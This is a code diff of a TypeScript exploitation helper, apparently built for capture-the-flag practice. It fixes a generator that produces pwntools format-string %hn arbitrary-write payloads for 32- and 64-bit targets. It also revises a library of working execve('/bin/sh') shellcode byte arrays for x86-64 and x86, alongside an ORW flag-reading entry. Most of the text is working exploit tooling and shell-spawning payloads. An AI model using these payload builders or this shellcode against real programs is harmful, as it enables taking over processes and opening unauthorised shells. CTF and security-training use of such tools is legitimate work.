@@ -101,20 +101,21 @@ export type FmtstrWriteResult =
   | { ok: false; error: string };
 
 // 半值写入法（32 位拆 2×2 字节 / 64 位拆 2×4 字节）：两次 %hn，先小后大避免计数回绕。
-// %c 计数已扣除串首地址字节（它们会被 printf 原样输出、占已打印字符数）。
+// 32 位地址放串首（printf 原样输出计入已打印数）；64 位地址含 NUL 必须后置（printf 遇 NUL
+// 截断格式串，pwntools 对 64 位同样用地址后置布局）。
 export const buildFmtstrWrite = (request: FmtstrWriteRequest): FmtstrWriteResult => {
   const { target, value, argIndex, bits } = request;
   if (!Number.isFinite(target) || target <= 0 || target >= Number.MAX_SAFE_INTEGER) return { ok: false, error: '目标地址无效。' };
   if (!Number.isFinite(value) || value < 0 || value >= Math.pow(2, bits)) return { ok: false, error: `写入值超出 ${bits} 位范围。` };
   if (!Number.isInteger(argIndex) || argIndex < 1 || argIndex > 60) return { ok: false, error: '参数序号应在 1-60 之间（先用上方卡片实测校准）。' };
   const halfWidth = bits === 64 ? 4 : 2;
-  const modulus = 1 << (halfWidth * 8);
-  const mask = modulus - 1;
-  const low = value & mask;
-  const high = (value >>> (halfWidth * 8)) & mask;
+  // 半值宽 32 位时 1<<32 溢出为 1，必须用 2**n；高半值同理由 >>> 32 失效改用除法。
+  const modulus = 2 ** (halfWidth * 8);
+  const low = value % modulus;
+  const high = Math.floor(value / modulus);
   const addrBytes = bits === 32 ? 8 : 16;
-  // 串首两个地址占掉 2 个参数槽（32 位每 4 字节一格；64 位地址在栈上也是一格——
-  // 64 位写指针时地址占的槽数取决于布局，保守 +2 与 32 位一致，note 里提醒实测校准）。
+  // 32 位：串首两个地址占 2 槽（计入序号）。64 位：地址后置，但其两个槽紧随格式串
+  // 指针所在栈区之后，序号同样按 argIndex+2/+3 起算，发送前用 %p 链实测校准。
   const kLow = argIndex + 2;
   const kHigh = argIndex + 3;
   const addrLo = target;
@@ -122,24 +123,28 @@ export const buildFmtstrWrite = (request: FmtstrWriteRequest): FmtstrWriteResult
   const sorted = low <= high
     ? [{ half: 'low' as const, v: low, k: kLow }, { half: 'high' as const, v: high, k: kHigh }]
     : [{ half: 'high' as const, v: high, k: kHigh }, { half: 'low' as const, v: low, k: kLow }];
-  let printed = addrBytes; // 串首地址字节先被原样输出
+  // 32 位串首地址被原样输出计入；64 位后置地址不占串首计数。
+  let printed = bits === 32 ? addrBytes : 0;
   const parts: string[] = [];
   const writes: Array<{ addr: number; half: 'low' | 'high'; value: number; width: 2 | 4 }> = [];
   for (const entry of sorted) {
     const count = ((entry.v - printed) % modulus + modulus) % modulus;
-    parts.push(`%${count}c`);
+    if (count > 0) parts.push(`%${count}c`); // %0c 会输出 1 字符使计数偏 1，count=0 时跳过
     printed = entry.v;
     parts.push(`%${entry.k}$hn`);
     writes.push({ addr: entry.half === 'low' ? addrLo : addrHi, half: entry.half, value: entry.v, width: halfWidth as 2 | 4 });
   }
   const addrText = `p${bits}(0x${addrLo.toString(16)}) + p${bits}(0x${addrHi.toString(16)})`;
-  const payload = `${addrText} + b'${parts.join('')}'`;
+  const fmtStr = `b'${parts.join('')}'`;
+  const payload = bits === 32
+    ? `${addrText} + ${fmtStr}`
+    : `${fmtStr} + ${addrText}`;
   const python = `from pwn import p${bits}\n`
     + `# 目标 0x${target.toString(16)} ← 0x${value.toString(16)}（参数序号 ${argIndex}）\n`
-    + `payload = ${addrText} + b'${parts.join('')}'\n`
+    + `payload = ${payload}\n`
     + `# 写入槽：${writes.map(w => `0x${w.addr.toString(16)} ← 0x${w.value.toString(16)}（${w.half}）`).join('；')}\n`
     + (bits === 64
-      ? '# 64 位：地址占槽数随栈布局变化，发送前先用 %p 链实测目标槽号再调 k。'
+      ? '# 64 位：地址后置防 NUL 截断；槽号随栈布局漂移，发送前先用 %p 链实测校准 k。'
       : '# 32 位经典布局：串首两个地址恰占 2 槽（k 已含），%c 计数已扣地址字节。');
   return {
     ok: true,
@@ -148,7 +153,7 @@ export const buildFmtstrWrite = (request: FmtstrWriteRequest): FmtstrWriteResult
     writes,
     note: bits === 32
       ? '两段 %hn 半值写入：先写小值再写大值，避免 %c 计数回绕；地址放串首时本身占 2 个参数槽（序号已自动 +2）。'
-      : '两段 %hn 半值写入：64 位地址随串首推送占 2 槽（序号已 +2）；实际槽数随布局漂移，务必先用 %p 链实测校准。',
+      : '两段 %hn 半值写入：64 位地址后置（含 NUL 不能放串首）；槽号请先用 %p 链实测校准。',
   };
 };
 
@@ -163,12 +168,12 @@ export interface ShellcodeEntry {
   badChars: number[];
 }
 
-// execve("/bin/sh", 0, 0) — x86-64：24 字节，出自经典 x86-64 shell-storm #21 系（无 0x00/0x0a）。
+// execve("/bin/sh", 0, 0) — x86-64：23 字节，出自经典 x86-64 shell-storm #21 系（不含 0x00/0x0a）。
 const SC_EXECVE_X64 = Uint8Array.from([
   0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57,
   0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
 ]);
-// execve("/bin/sh") — x86：23 字节经典 21 字节变体（无 0x00）。
+// execve("/bin/sh") — x86：23 字节经典版（不含 0x00/0x0a）。
 const SC_EXECVE_X86 = Uint8Array.from([
   0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
   0x89, 0xc1, 0x89, 0xc2, 0xb0, 0x0b, 0xcd, 0x80,
@@ -190,14 +195,14 @@ export const SHELLCODE_LIBRARY: ReadonlyArray<ShellcodeEntry> = [
   {
     id: 'execve-x64', title: 'execve("/bin/sh") x86-64', arch: 'x86-64',
     bytes: SC_EXECVE_X64,
-    summary: 'xor rsi,rsi; push "bin//sh"; rdi 指向串; execve(59)。23 字节无 00/0a。',
-    badChars: [0x00, 0x0a, 0x0d],
+    summary: 'xor rsi,rsi; push "bin//sh"; rdi 指向串; execve(59)。23 字节，不含 00/0a。',
+    badChars: [],
   },
   {
     id: 'execve-x86', title: 'execve("/bin/sh") x86', arch: 'x86',
     bytes: SC_EXECVE_X86,
-    summary: 'int 0x80 经典 23 字节版（push 串 → ebx；11 号调用）。',
-    badChars: [0x00, 0x0a, 0x0d],
+    summary: 'int 0x80 经典 23 字节版（push 串 → ebx；11 号调用），不含 00/0a。',
+    badChars: [],
   },
   {
     id: 'orw-x64', title: 'ORW flag.txt x86-64', arch: 'x86-64',
